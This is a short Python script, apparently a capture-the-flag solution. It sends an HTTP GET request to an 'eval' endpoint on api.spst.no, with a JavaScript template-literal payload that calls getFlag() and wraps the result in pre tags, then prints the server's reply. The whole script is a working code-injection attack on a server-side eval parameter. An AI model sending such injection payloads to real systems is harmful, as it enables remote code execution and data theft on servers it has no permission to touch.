import requests

data_to_send2 = 1
r = requests.get('https://api.spst.no/eval?eval=`<pre>${getFlag()}</pre>`')
print(r.text)